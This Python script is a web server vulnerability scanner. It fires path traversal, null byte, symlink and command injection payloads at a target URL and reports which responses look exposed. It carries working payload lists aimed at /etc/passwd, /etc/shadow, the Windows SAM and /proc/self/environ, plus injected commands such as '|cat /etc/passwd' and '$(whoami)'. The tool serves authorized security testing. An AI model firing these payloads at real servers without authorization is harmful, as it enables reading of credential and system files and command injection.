#!/usr/bin/env python3
"""
Web Server Security Testing Tool
Tests for path traversal, null byte injection, and symlink vulnerabilities
"""

import requests
import urllib.parse
import sys
from typing import List, Dict
import json
from datetime import datetime

class SecurityTester:
    def __init__(self, base_url: str, timeout: int = 5):
        """
        Initialize the security tester
        
        Args:
            base_url: Base URL of the web server to test
            timeout: Request timeout in seconds
        """
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.results = []
        
    def test_path_traversal(self) -> List[Dict]:
        """Test various path traversal attack vectors"""
        print("\n[*] Testing Path Traversal Vulnerabilities...")
        
        # Common path traversal payloads
        payloads = [
            # Basic traversal
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "..\\..\\..\\",
            
            # URL encoded
            "%2e%2e/",
            "%2e%2e\\",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "..%2f",
            "..%5c",
            
            # Double URL encoded
            "%252e%252e/",
            "%252e%252e%252f",
            
            # Unicode encoded
            "..%c0%af",
            "..%c1%9c",
            
            # Overlong UTF-8
            "..%ef%bc%8f",
            
            # Mixed encodings
            "..%252f",
            "..%255c",
            
            # With null bytes
            "../%00",
            "..\\%00",
            
            # Attempting to access sensitive files
            "../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../etc/shadow",
            "../../../../etc/hosts",
            
            # Absolute paths
            "/etc/passwd",
            "\\windows\\win.ini",
            
            # Dot segments
            "....//",
            "....\\\\",
        ]
        
        results = []
        for payload in payloads:
            result = self._send_request(payload, "Path Traversal")
            results.append(result)
            self._print_result(result)
            
        return results
    
    def test_null_byte_injection(self) -> List[Dict]:
        """Test null byte injection vulnerabilities"""
        print("\n[*] Testing Null Byte Injection...")
        
        payloads = [
            # Null byte variations
            "file.txt%00",
            "file.txt%00.jpg",
            "file%00.txt",
            "../../etc/passwd%00",
            "../config%00.php",
            
            # Multiple null bytes
            "file%00%00.txt",
            
            # Null byte with path traversal
            "../%00/etc/passwd",
            "..\\%00\\windows\\win.ini",
            
            # URL encoded null
            "file.txt%2500",
            
            # Raw null byte (if supported)
            "file.txt\x00",
            "file.txt\x00.jpg",
        ]
        
        results = []
        for payload in payloads:
            result = self._send_request(payload, "Null Byte Injection")
            results.append(result)
            self._print_result(result)
            
        return results
    
    def test_symlink_attacks(self) -> List[Dict]:
        """Test symlink following vulnerabilities"""
        print("\n[*] Testing Symlink Following Vulnerabilities...")
        
        payloads = [
            # Common symlink targets
            "link",
            "symlink",
            "../link",
            "files/link",
            
            # Symlink to sensitive files
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            
            # Testing for symlink in different directories
            "uploads/../../etc/passwd",
            "static/../../../etc/shadow",
        ]
        
        results = []
        for payload in payloads:
            result = self._send_request(payload, "Symlink Attack")
            results.append(result)
            self._print_result(result)
            
        return results
    
    def test_additional_injections(self) -> List[Dict]:
        """Test additional injection vectors"""
        print("\n[*] Testing Additional Injection Vectors...")
        
        payloads = [
            # Command injection attempts in file paths
            "file.txt;ls",
            "file.txt|cat /etc/passwd",
            "file.txt`whoami`",
            "file.txt$(whoami)",
            
            # Special characters
            "file<>.txt",
            "file?.txt",
            "file*.txt",
            
            # Long paths (buffer overflow attempt)
            "A" * 1000,
            "../" * 100,
        ]
        
        results = []
        for payload in payloads:
            result = self._send_request(payload, "Additional Injection")
            results.append(result)
            self._print_result(result)
            
        return results
    
    def _send_request(self, payload: str, attack_type: str) -> Dict:
        """
        Send a request with the given payload
        
        Args:
            payload: The attack payload to test
            attack_type: Type of attack being tested
            
        Returns:
            Dictionary containing test results
        """
        url = f"{self.base_url}/{payload}"
        
        try:
            response = requests.get(url, timeout=self.timeout, allow_redirects=False)
            
            result = {
                "timestamp": datetime.now().isoformat(),
                "attack_type": attack_type,
                "payload": payload,
                "url": url,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "headers": dict(response.headers),
                "vulnerable": self._check_vulnerability(response, payload),
                "response_preview": response.text[:200] if response.text else ""
            }
            
        except requests.exceptions.Timeout:
            result = {
                "timestamp": datetime.now().isoformat(),
                "attack_type": attack_type,
                "payload": payload,
                "url": url,
                "status_code": "TIMEOUT",
                "vulnerable": False,
                "error": "Request timeout"
            }
        except requests.exceptions.RequestException as e:
            result = {
                "timestamp": datetime.now().isoformat(),
                "attack_type": attack_type,
                "payload": payload,
                "url": url,
                "status_code": "ERROR",
                "vulnerable": False,
                "error": str(e)
            }
        
        self.results.append(result)
        return result
    
    def _check_vulnerability(self, response, payload: str) -> bool:
        """
        Check if the response indicates a vulnerability
        
        Args:
            response: HTTP response object
            payload: The payload that was sent
            
        Returns:
            Boolean indicating if vulnerability detected
        """
        # Check for successful responses that might indicate vulnerability
        if response.status_code == 200:
            content = response.text.lower()
            
            # Check for sensitive file contents
            sensitive_patterns = [
                "root:",  # /etc/passwd
                "[boot loader]",  # Windows boot.ini
                "[extensions]",  # Windows win.ini
                "administrator",
                "password",
                "secret",
            ]
            
            for pattern in sensitive_patterns:
                if pattern in content:
                    return True
        
        # 403 Forbidden might indicate the path exists but is protected
        # 404 Not Found is generally good (path not accessible)
        # 500 Internal Server Error might indicate improper handling
        
        return response.status_code in [200, 500]
    
    def _print_result(self, result: Dict):
        """Print a formatted test result"""
        status = result.get('status_code', 'ERROR')
        vulnerable = result.get('vulnerable', False)
        
        if vulnerable:
            print(f"  [!] POTENTIAL VULNERABILITY - Payload: {result['payload']} - Status: {status}")
        elif status in ['ERROR', 'TIMEOUT']:
            print(f"  [X] {status} - Payload: {result['payload']}")
        elif status in [500]:
            print(f"  [?] Server Error - Payload: {result['payload']} - Status: {status}")
        else:
            print(f"  [✓] Blocked - Payload: {result['payload']} - Status: {status}")
    
    def generate_report(self, output_file: str = None):
        """Generate a detailed test report"""
        print("\n" + "="*70)
        print("SECURITY TEST REPORT")
        print("="*70)
        
        total_tests = len(self.results)
        vulnerabilities = [r for r in self.results if r.get('vulnerable', False)]
        errors = [r for r in self.results if r.get('status_code') in ['ERROR', 'TIMEOUT', 500]]
        
        print(f"\nTarget: {self.base_url}")
        print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Tests: {total_tests}")
        print(f"Potential Vulnerabilities: {len(vulnerabilities)}")
        print(f"Errors/Timeouts: {len(errors)}")
        
        if vulnerabilities:
            print("\n[!] POTENTIAL VULNERABILITIES FOUND:")
            for vuln in vulnerabilities:
                print(f"\n  Attack Type: {vuln['attack_type']}")
                print(f"  Payload: {vuln['payload']}")
                print(f"  URL: {vuln['url']}")
                print(f"  Status Code: {vuln['status_code']}")
                print(f"  Response Preview: {vuln.get('response_preview', 'N/A')[:100]}")
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n[*] Detailed results saved to: {output_file}")
        
        print("\n" + "="*70)
    
    def run_all_tests(self):
        """Run all security tests"""
        print(f"\n{'='*70}")
        print(f"Starting Security Tests on: {self.base_url}")
        print(f"{'='*70}")
        
        self.test_path_traversal()
        self.test_null_byte_injection()
        self.test_symlink_attacks()
        self.test_additional_injections()
        
        self.generate_report("security_test_results.json")


def main():
    """Main function"""
    if len(sys.argv) < 2:
        print("Usage: python webserver_security_tester.py <base_url> [timeout]")
        print("\nExample:")
        print("  python webserver_security_tester.py http://localhost:8080")
        print("  python webserver_security_tester.py http://example.com 10")
        sys.exit(1)
    
    base_url = sys.argv[1]
    timeout = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    
    print("\n" + "="*70)
    print("WEB SERVER SECURITY TESTING TOOL")
    print("="*70)
    print("\n[!] WARNING: Only test servers you own or have permission to test!")
    print("[!] Unauthorized testing may be illegal in your jurisdiction.")
    
    response = input("\nDo you have permission to test this server? (yes/no): ")
    if response.lower() != 'yes':
        print("\n[X] Test cancelled. Please obtain proper authorization first.")
        sys.exit(0)
    
    tester = SecurityTester(base_url, timeout)
    tester.run_all_tests()


if __name__ == "__main__":
    main()
